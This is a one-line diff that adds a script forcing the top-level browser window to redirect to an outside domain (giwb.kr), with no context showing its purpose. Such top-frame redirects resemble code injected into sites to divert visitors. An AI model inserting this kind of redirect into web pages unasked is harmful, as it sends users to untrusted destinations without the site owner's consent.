@@ -1,0 +1,1 @@
+<script> top.location.replace('https://giwb.kr'); </script>
